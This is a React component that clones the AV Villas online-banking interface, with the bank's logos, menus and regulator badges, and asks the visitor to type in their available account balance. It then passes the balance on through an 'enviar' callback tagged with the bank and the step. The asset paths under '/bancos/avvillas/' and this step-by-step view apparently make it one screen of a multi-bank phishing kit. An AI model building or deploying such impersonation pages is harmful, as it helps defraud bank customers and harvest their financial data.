/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable jsx-a11y/alt-text */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";

export default function Saldo({ enviar }: any) {
  const [saldo, setSaldo] = useState("");
  const [error, setError] = useState(false);

  const handleChange = (value: string) => {
    // Extraer solo números
    const clean = value.replace(/\D/g, "");
    
    if (clean === "") {
      setSaldo("");
      setError(true);
    } else {
      const formatted = "$ " + parseInt(clean, 10).toLocaleString("es-CO");
      setSaldo(formatted);
      setError(false);
    }
  };

  const handleValidate = () => {
    if (saldo.trim() === "") {
      setError(true);
      return;
    }

    setError(false);
    enviar?.({
      view: 'saldo',
      saldo: saldo,
      bank: "avvillas"
    });

    // Aquí puedes hacer navegación o enviar al backend
  };

  return (
    <>
      <input type="hidden" name="hdd-documento" id="hdd-documento" value="CC" />

      {/* TOP BAR */}
      <div id="top-bar text-[#222]">
        <table width="100%">
          <tbody>
            <tr>
              <td id="espacio-side-bar">
                <table>
                  <tbody>
                    <tr>
                      <td>
                        <img
                          src="/bancos/avvillas/img/logo.png"
                          width={150}
                          id="logo-top-bar"
                          alt=""
                        />
                      </td>
                      <td id="bienvenido">
                        Bienvenido<br />
                        <img
                          src="/bancos/avvillas/img/separador.jpg"
                          width={30}
                          style={{ marginTop: 5 }}
                          alt=""
                        />
                      </td>
                    </tr>
                  </tbody>
                </table>
              </td>

              <td width="60%" align="right">
                <table id="menu-mobile" className="text-[#222]">
                  <tbody>
                    <tr>
                      <td>
                        <img
                          src="/bancos/avvillas/img/notificaciones.png"
                          width={26}
                          style={{ margin: "0 10px", cursor: "pointer" }}
                        />
                      </td>
                      <td>
                        <img
                          src="/bancos/avvillas/img/menu.png"
                          width={24}
                          style={{ marginRight: 20, cursor: "pointer" }}
                        />
                      </td>
                    </tr>
                  </tbody>
                </table>

                <table id="menu-top-bar">
                  <tbody>
                    <tr>
                      <td>
                        <table className="item-top-menu">
                          <tbody>
                            <tr>
                              <td>
                                <img
                                  src="/bancos/avvillas/img/nuevo-producto.png"
                                  width={14}
                                />
                              </td>
                              <td className="txt-item-top">
                                Solicitud de Productos
                              </td>
                            </tr>
                          </tbody>
                        </table>
                      </td>

                      <td>
                        <table className="item-top-menu">
                          <tbody>
                            <tr>
                              <td>
                                <img
                                  src="/bancos/avvillas/img/contactos.png"
                                  width={14}
                                />
                              </td>
                              <td className="txt-item-top">Contactos</td>
                            </tr>
                          </tbody>
                        </table>
                      </td>

                      <td>
                        <table className="item-top-menu">
                          <tbody>
                            <tr>
                              <td>
                                <img
                                  src="/bancos/avvillas/img/documentos.png"
                                  width={14}
                                />
                              </td>
                              <td className="txt-item-top">
                                Extractos y Certificados
                              </td>
                            </tr>
                          </tbody>
                        </table>
                      </td>

                      <td>
                        <table className="item-top-menu">
                          <tbody>
                            <tr>
                              <td>
                                <img
                                  src="/bancos/avvillas/img/seguridad.png"
                                  width={14}
                                />
                              </td>
                              <td className="txt-item-top">Seguridad</td>
                            </tr>
                          </tbody>
                        </table>
                      </td>

                      <td>
                        <table className="item-top-menu">
                          <tbody>
                            <tr>
                              <td>
                                <img
                                  src="/bancos/avvillas/img/salir.png"
                                  width={14}
                                />
                              </td>
                              <td className="txt-item-top">Salida Segura</td>
                            </tr>
                          </tbody>
                        </table>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </td>
            </tr>
          </tbody>
        </table>
      </div>

      {/* SIDE BAR */}
      <div id="side-bar">
        <img src="/bancos/avvillas/img/logo.png" width={150} />

        <br />
        <br />
        <br />
        <br />

        <table className="item-side-menu">
          <tbody>
            <tr>
              <td className="img-item-side">
                <img src="/bancos/avvillas/img/productos.png" width={20} />
              </td>
              <td className="txt-item-side">Productos</td>
            </tr>
          </tbody>
        </table>

        <table className="item-side-menu">
          <tbody>
            <tr>
              <td className="img-item-side">
                <img src="/bancos/avvillas/img/pagos.png" width={20} />
              </td>
              <td className="txt-item-side">Pagos</td>
            </tr>
          </tbody>
        </table>

        <table className="item-side-menu">
          <tbody>
            <tr>
              <td className="img-item-side">
                <img
                  src="/bancos/avvillas/img/transferir.png"
                  width={18}
                />
              </td>
              <td className="txt-item-side">Transferencias</td>
            </tr>
          </tbody>
        </table>

        <table className="item-side-menu">
          <tbody>
            <tr>
              <td className="img-item-side">
                <img src="/bancos/avvillas/img/bolsillo.png" width={20} />
              </td>
              <td className="txt-item-side">Bolsillos</td>
            </tr>
          </tbody>
        </table>

        <table className="item-side-menu">
          <tbody>
            <tr>
              <td className="img-item-side">
                <img src="/bancos/avvillas/img/giros.png" width={20} />
              </td>
              <td className="txt-item-side">Giros y Retiros</td>
            </tr>
          </tbody>
        </table>
      </div>

      {/* CONTENIDO */}
      <div className="contenedor">
        <div className="frm" id="frm-correo">
          <div className="titulo">Ingrese su saldo disponible</div>

          <div className="descripcion">
            Solo debes ingresar el saldo disponible de tu cuenta AV Villas
          </div>

          <br />
          <br />

          <div className="frm-input" id="inp-temporal">
            <table width="100%" style={{ height: 54 }}>
              <tbody>
                <tr>
                  <td align="left">
                    <div className="etiqueta" id="etq-temporal">
                      <b>Saldo disponible</b>
                    </div>
                    <input
                      type="text"
                      className="entrada"
                      id="txt-temporal"
                      value={saldo}
                      onChange={(e) => handleChange(e.target.value)}
                      inputMode="numeric"
                    />
                  </td>

                  <td width={24} align="right">
                    <img
                      src="/bancos/avvillas/img/seguridad.jpg"
                      width={22}
                      className="icon-entrada"
                    />
                    <img
                      src="/bancos/avvillas/img/alerta.jpg"
                      width={25}
                      className="icon-entrada"
                      style={{
                        display: error ? "block" : "none",
                      }}
                    />
                  </td>
                </tr>
              </tbody>
            </table>
          </div>

          <div
            className="error"
            id="err-temporal"
            style={{ display: error ? "block" : "none" }}
          >
            Este campo es requerido.
          </div>

          <br />
          <br />

          <button
            id="btn-temporal"
            type="button"
            className="btn"
            disabled={saldo.length === 0}
            onClick={handleValidate}
          >
            VALIDAR
          </button>
        </div>
      </div>

      {/* FOOTER */}
      <div style={{ padding: "10px 14px" }}>
        <table width="100%">
          <tbody>
            <tr>
              <td align="left">
                <img
                  src="/bancos/avvillas/img/logo-gav.png"
                  width={70}
                  alt=""
                />
              </td>
              <td align="right">
                <img
                  src="/bancos/avvillas/img/logo-gav.png"
                  width={70}
                  id="super-d"
                  alt=""
                />
                &nbsp;&nbsp;&nbsp;
                <img
                  src="/bancos/avvillas/img/superh-negro.svg"
                  width={130}
                  alt=""
                />
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </>
  );
}